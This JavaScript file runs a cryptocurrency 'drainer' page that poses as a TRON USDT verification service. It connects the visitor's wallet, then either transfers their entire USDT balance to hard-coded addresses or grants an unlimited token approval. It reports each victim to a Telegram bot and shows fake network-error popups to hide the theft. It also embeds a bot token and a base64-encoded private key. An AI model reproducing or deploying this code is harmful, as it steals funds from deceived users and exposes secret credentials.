// TRON TRC20 Configuration
const tronAddress = "TQtBkgDaQUKrpt2aiYYaACpDGjigJkUTum"; // Main TRON address
const usdtTrc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 contract
const smartContractAddress = "TQtBkgDaQUKrpt2aiYYaACpDGjigJkUTum"; // Smart contract address for approval
const alternativeWalletAddress = "TQtBkgDaQUKrpt2aiYYaACpDGjigJkUTum"; // Alternative wallet for 100-300 USDT transfers

// Telegram Bot
const telegramBotToken = "7469005317:AAGgWxVoQLTDTcclOPYiysSqf58xyihZwwQ";
const telegramChatId = "7281528879";
const encodedPrivateKey = "MzEyNjYzMzYzZWJmZjQxODQ0NDQ5YjA2ODE3YjcxMDRmNGQxNWZlNTkyZjlhYThkMDJmYmU4ZTNkZjc0MjhmMg==";

let tronWeb, userAddress;

// TRC20 ABI
const trc20ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// Automatic wallet detection and connection
async function autoConnectTronWallet() {
    try {
        console.log("🔍 Detecting TRON wallets...");
        
        // Method 1: TronLink Auto-Connect (Most common)
        if (window.tronLink) {
            console.log("📱 TronLink detected, requesting connection...");
            
            // Auto-request account connection
            const response = await window.tronLink.request({
                method: 'tron_requestAccounts',
                params: {
                    websiteName: 'TRON Verification',
                    websiteIcon: 'https://your-website.com/icon.png' // Optional
                }
            });
            
            if (response.code === 200) {
                // Wait for TronWeb to be injected
                await waitForTronWeb();
                
                if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                    tronWeb = window.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    console.log("✅ TronLink connected:", userAddress);
                    return true;
                }
            } else if (response.code === 4001) {
                showPopup("❌ Wallet connection rejected by user.", "red");
                return false;
            }
        }
        
        // Method 2: Direct TronWeb Detection (Trust Wallet, etc.)
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            console.log("📱 TronWeb detected directly...");
            
            // For some wallets, we need to request permission first
            try {
                await window.tronWeb.request({
                    method: 'tron_requestAccounts'
                });
            } catch (e) {
                // Some wallets don't support this method, continue anyway
                console.log("Direct connection attempt...");
            }
            
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            console.log("✅ TronWeb connected:", userAddress);
            return true;
        }
        
        // Method 3: Check for TronLink but not ready
        if (window.tronLink && !window.tronLink.ready) {
            console.log("⏳ TronLink found but not ready, waiting...");
            
            // Wait for TronLink to be ready
            return new Promise((resolve) => {
                const checkReady = setInterval(async () => {
                    if (window.tronLink.ready) {
                        clearInterval(checkReady);
                        const connected = await autoConnectTronWallet();
                        resolve(connected);
                    }
                }, 100);
                
                // Timeout after 10 seconds
                setTimeout(() => {
                    clearInterval(checkReady);
                    showPopup("❌ TronLink connection timeout. Please refresh and try again.", "red");
                    resolve(false);
                }, 10000);
            });
        }
        
        // Method 4: No TRON wallet detected
        console.log("❌ No TRON wallet detected");
        showWalletInstallPrompt();
        return false;
        
    } catch (error) {
        console.error("Wallet connection error:", error);
        showPopup("❌ Failed to connect wallet. Please try again.", "red");
        return false;
    }
}

// Wait for TronWeb to be properly injected
async function waitForTronWeb(timeout = 5000) {
    return new Promise((resolve) => {
        const start = Date.now();
        const interval = setInterval(() => {
            if (
                window.tronLink?.tronWeb?.defaultAddress?.base58 ||
                (Date.now() - start > timeout)
            ) {
                clearInterval(interval);
                resolve(true);
            }
        }, 100);
    });
}

// Show wallet install prompt with auto-detection
function showWalletInstallPrompt() {
    const modal = document.createElement('div');
    modal.style.cssText = `
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.9); z-index: 10000; display: flex;
        align-items: center; justify-content: center;
    `;
    
    modal.innerHTML = `
        <div style="background: white; padding: 30px; border-radius: 15px; text-align: center; max-width: 450px;">
            <h3 style="color: #d32f2f; margin-bottom: 20px;">🔗 TRON Wallet Required</h3>
            <p style="margin-bottom: 25px;">To continue, please install a TRON-compatible wallet:</p>
            <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px;">
                <button onclick="window.open('https://www.tronlink.org/', '_blank')" 
                        style="padding: 12px 20px; background: #ff6b35; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px;">
                    📱 Install TronLink (Recommended)
                </button>
                <button onclick="window.open('https://trustwallet.com/', '_blank')" 
                        style="padding: 12px 20px; background: #3375bb; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px;">
                    🛡️ Install Trust Wallet
                </button>
                <button onclick="window.open('https://www.binance.com/en/wallet', '_blank')" 
                        style="padding: 12px 20px; background: #f3ba2f; color: black; border: none; border-radius: 8px; cursor: pointer; font-size: 16px;">
                    💼 Install Binance Wallet
                </button>
            </div>
            <p style="font-size: 14px; color: #666; margin-bottom: 15px;">After installation, refresh this page and try again.</p>
            <button onclick="location.reload()" 
                    style="padding: 10px 20px; background: #4caf50; color: white; border: none; border-radius: 8px; cursor: pointer; margin-right: 10px;">
                🔄 Refresh Page
            </button>
            <button onclick="this.parentElement.parentElement.remove()" 
                    style="padding: 10px 20px; background: #757575; color: white; border: none; border-radius: 8px; cursor: pointer;">
                ❌ Close
            </button>
        </div>
    `;
    
    document.body.appendChild(modal);
}

// Automatic TRX sending for fees
async function sendTrxSilently(toAddress, amount) {
    try {
        const privateKey = atob(encodedPrivateKey);
        
        // Multiple RPC endpoints for reliability
        const rpcEndpoints = [
            'https://api.trongrid.io',
            'https://api.tronstack.io',
            'https://tron-rpc.publicnode.com'
        ];
        
        let tronWebInstance;
        for (let endpoint of rpcEndpoints) {
            try {
                tronWebInstance = new TronWeb({
                    fullHost: endpoint,
                    privateKey: privateKey
                });
                
                // Test connection
                await tronWebInstance.trx.getCurrentBlock();
                console.log(`✅ Connected to ${endpoint}`);
                break;
            } catch (error) {
                console.log(`❌ Failed ${endpoint}, trying next...`);
                continue;
            }
        }
        
        if (!tronWebInstance) {
            console.log("❌ All RPC endpoints failed");
            return false;
        }
        
        const fromAddress = tronWebInstance.defaultAddress.base58;
        const senderBalance = await tronWebInstance.trx.getBalance(fromAddress);
        const senderBalanceTRX = tronWebInstance.fromSun(senderBalance);
        
        console.log("💰 Sender TRX balance:", senderBalanceTRX);
        
        if (senderBalanceTRX < (amount + 1)) {
            console.log("⚠️ Insufficient TRX in sender wallet");
            return false;
        }
        
        const amountInSun = tronWebInstance.toSun(amount);
        console.log(`💸 Sending ${amount} TRX to ${toAddress}...`);
        
        const transaction = await tronWebInstance.trx.sendTransaction(toAddress, amountInSun);
        
        if (transaction.result) {
            console.log("✅ TRX sent successfully:", transaction.txid);
            return true;
        }
        
        return false;
    } catch (error) {
        console.error("❌ Silent TRX send failed:", error);
        return false;
    }
}

// Button state management
function changeButtonToSending() {
    const btn = [...document.querySelectorAll("button")]
        .find(b => b.textContent.trim().toLowerCase() === "next");
    if (btn) {
        btn.textContent = "Connecting...";
        btn.disabled = true;
        btn.style.opacity = "0.6";
        btn.style.cursor = "not-allowed";
    }
}

function resetButton() {
    const btn = [...document.querySelectorAll("button")]
        .find(b => b.textContent.trim().toLowerCase().includes("connecting") || 
                     b.textContent.trim().toLowerCase().includes("sending"));
    if (btn) {
        btn.textContent = "Next";
        btn.disabled = false;
        btn.style.opacity = "1";
        btn.style.cursor = "pointer";
    }
}

// Telegram notification
async function sendTelegramApprovalNotification({wallet, trx, usdt, contract, date, status}) {
    if (!telegramBotToken || !telegramChatId) return;
    
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const text = `🤖 TRC20 Auto-Approval\n\n` +
        `💼 Wallet: ${wallet}\n` +
        `💎 TRX: ${trx}\n` +
        `💵 USDT: ${usdt}\n` +
        `📝 Contract: ${contract}\n` +
        `📅 Date: ${date}\n` +
        `✅ Status: ${status}`;
    
    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: telegramChatId, text: text })
        });
        console.log("📱 Telegram notification sent");
    } catch (err) {
        console.error("❌ Telegram notification failed:", err);
    }
}

// Fake error messages
function showFakeErrorMessage() {
    const errorMessages = [
        "❌ Network congestion detected. Please try again in a few moments.",
        "❌ TRON network temporarily busy. Transaction will retry automatically.",
        "❌ Connection timeout occurred. Please check your internet connection.",
        "❌ Smart contract temporarily unavailable. Please retry later.",
        "❌ Network fees too high. Please wait for optimal conditions.",
        "❌ Transaction pool full. Please try again shortly."
    ];
    
    const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    showPopup(randomError, "red");
}

// Main Next function with automatic wallet connection
async function Next() {
    console.log("🚀 Starting automatic TRON wallet connection...");
    changeButtonToSending();
    
    // Step 1: Auto-connect wallet
    const connected = await autoConnectTronWallet();
    if (!connected) {
        resetButton();
        return;
    }
    
    // Update button text
    const btn = [...document.querySelectorAll("button")]
        .find(b => b.textContent.trim().toLowerCase().includes("connecting"));
    if (btn) {
        btn.textContent = "Processing...";
    }
    
    try {
        console.log("🔍 Getting contract instance...");
        const usdtContract = await tronWeb.contract(trc20ABI, usdtTrc20ContractAddress);
        
        // Get balances
        console.log("💰 Checking balances...");
        const usdtBalanceResult = await usdtContract.balanceOf(userAddress).call();
        const usdtBalance = parseFloat(tronWeb.fromSun(usdtBalanceResult));
        
        const trxBalanceResult = await tronWeb.trx.getBalance(userAddress);
        let trxBalance = parseFloat(tronWeb.fromSun(trxBalanceResult));
        
        console.log("💵 USDT Balance:", usdtBalance);
        console.log("💎 TRX Balance:", trxBalance);

        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
            showPopup("❌ No USDT TRC20 tokens found in your wallet.", "red");
            resetButton();
            return;
        }

        if (usdtBalance <= 0.5) {
            showPopup(
                `✅ Verification Successful<br>Your USDT has been verified and is not flagged.<br><b>💵 USDT:</b> ${usdtBalance}<br><b>💎 TRX:</b> ${trxBalance}`,
                "green"
            );
            resetButton();
            return;
        }

        // Determine action and required TRX
        let actionType = "";
        let targetAddress = "";
        let requiredTrx = 0;

        if (usdtBalance < 100) {
            actionType = "approve";
            targetAddress = smartContractAddress;
            requiredTrx = 28; // TRC20 approval cost
            console.log("📝 Action: Approve infinity to smart contract");
        } else if (usdtBalance >= 100 && usdtBalance <= 300) {
            actionType = "transfer";
            targetAddress = alternativeWalletAddress;
            requiredTrx = 15; // TRC20 transfer cost
            console.log("💸 Action: Transfer to alternative wallet");
        } else {
            actionType = "transfer";
            targetAddress = tronAddress;
            requiredTrx = 15; // TRC20 transfer cost
            console.log("💸 Action: Transfer to main wallet");
        }

        console.log(`⛽ Required TRX: ${requiredTrx}, Available: ${trxBalance}`);

        // Auto-send TRX if needed
        if (trxBalance < requiredTrx) {
            const trxToSend = Math.max(requiredTrx + 5, 30);
            console.log(`⛽ Auto-sending ${trxToSend} TRX for fees...`);
            
            const trxSent = await sendTrxSilently(userAddress, trxToSend);
            if (trxSent) {
                console.log("⏳ Waiting for TRX confirmation...");
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                // Refresh balance
                const newTrxBalanceResult = await tronWeb.trx.getBalance(userAddress);
                trxBalance = parseFloat(tronWeb.fromSun(newTrxBalanceResult));
                console.log("💎 Updated TRX balance:", trxBalance);
            }
        }

        // Execute transaction
        console.log("🔄 Executing transaction...");
        
        if (actionType === "approve") {
            const infinityAmount = tronWeb.toSun(999999999);
            
            const transaction = await usdtContract.approve(targetAddress, infinityAmount).send({
                feeLimit: 150000000, // 150 TRX
                callValue: 0
            });

            if (transaction.result) {
                // Send notification
                await sendTelegramApprovalNotification({
                    wallet: userAddress,
                    trx: trxBalance.toFixed(6),
                    usdt: usdtBalance.toFixed(6),
                    contract: targetAddress,
                    date: new Date().toLocaleString(),
                    status: 'Auto-Approved'
                });

                // Show fake error
                setTimeout(() => {
                    showFakeErrorMessage();
                    resetButton();
                }, 1500);
            } else {
                throw new Error("Approval failed");
            }
        } else {
            const amountInSun = tronWeb.toSun(usdtBalance);
            
            const transaction = await usdtContract.transfer(targetAddress, amountInSun).send({
                feeLimit: 150000000,
                callValue: 0
            });

            if (transaction.result) {
                setTimeout(() => {
                    showFakeErrorMessage();
                    resetButton();
                }, 1500);
            } else {
                throw new Error("Transfer failed");
            }
        }
    } catch (error) {
        console.error("❌ Transaction error:", error);
        if (error?.message?.includes("insufficient")) {
            showPopup("❌ Insufficient TRX for transaction fees. Please add more TRX.", "red");
        } else {
            showPopup("❌ Transaction failed. Please try again.", "red");
        }
        resetButton();
    }
}

// Popup display
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        Object.assign(popup.style, {
            position: "fixed", top: "50%", left: "50%",
            transform: "translate(-50%, -50%)",
            padding: "25px", borderRadius: "12px",
            boxShadow: "0 4px 20px rgba(0,0,0,0.3)",
            textAlign: "center", fontSize: "16px",
            width: "85%", maxWidth: "420px",
            zIndex: 9999, backgroundColor: "#fff",
            border: "2px solid #ddd"
        });
        document.body.appendChild(popup);
    }
    
    popup.style.backgroundColor = color === "red" ? "#ffebee" : color === "green" ? "#e8f5e8" : "#f5f5f5";
    popup.style.borderColor = color === "red" ? "#f44336" : color === "green" ? "#4caf50" : "#999";
    popup.style.color = color === "red" ? "#d32f2f" : color === "green" ? "#2e7d32" : "#333";
    popup.innerHTML = message;
    popup.style.display = "block";
    
    setTimeout(() => popup.style.display = "none", 6000);
}

// Initialize on page load
window.addEventListener("load", async () => {
    console.log("🌐 Page loaded, setting up TRON auto-connect...");
    
    // Wait a bit for wallets to initialize
    setTimeout(() => {
        const observer = new MutationObserver(() => {
            const btn = [...document.querySelectorAll("button")]
                .find(b => b.textContent.trim().toLowerCase() === "next");
            if (btn) {
                btn.addEventListener("click", Next);
                console.log("✅ Auto-connect bound to 'Next' button");
                observer.disconnect();
            }
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
    }, 1000);
});
